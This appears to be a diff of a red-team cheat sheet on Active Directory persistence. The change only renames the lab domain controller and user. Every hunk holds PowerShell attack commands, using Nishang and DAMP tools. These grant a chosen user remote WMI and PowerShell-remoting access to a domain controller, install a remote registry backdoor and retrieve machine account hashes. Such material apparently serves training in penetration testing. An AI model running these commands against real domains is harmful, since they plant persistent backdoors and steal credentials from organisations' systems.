@@ -377,10 +377,10 @@ link to Nishang- https://github.com/samratashok/nishang/tree/master/Backdoors
 ```
 . .\Set-RemoteWMI.ps1
 
-Set-RemoteWMI -UserName studentx -ComputerName dcorp- dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -UserName Josh -ComputerName dc01.ecorp.lab -namespace 'root\cimv2' -Verbose
 ```
 ```
-gwmi -class win32_operatingsystem -ComputerName dcorp- dc.dollarcorp.moneycorp.local
+gwmi -class win32_operatingsystem -ComputerName dc01.ecorp.lab
 ```
 
 
@@ -390,7 +390,7 @@ link to Nishang - https://github.com/samratashok/nishang/tree/master/Backdoors
 ```
 . .\Set-RemotePSRemoting.ps1
 
-Set-RemotePSRemoting -UserName studentx -ComputerName dcorp- dc.dollarcorp.moneycorp.local -Verbose
+Set-RemotePSRemoting -UserName Josh -ComputerName dc01.ecorp.lab -Verbose
 ```
 
 #### Remote Registry - DAMP
@@ -399,13 +399,13 @@ link to DAMP -
 ```
 . .\DAMP-master\Add-RemoteRegBackdoor.ps1
 
-Add-RemoteRegBackdoor -ComputerName dcorp- dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
+Add-RemoteRegBackdoor -ComputerName dc01.ecorp.lab -Trustee Josh -Verbose
 ```
 
 ```
 . .\DAMP-master\RemoteHashRetrieval.ps1
 
-Get-RemoteMachineAccountHash -ComputerName dcorp- dc.dollarcorp.moneycorp.local -Verbose
+Get-RemoteMachineAccountHash -ComputerName dc01.ecorp.lab -Verbose
 ```
 
 
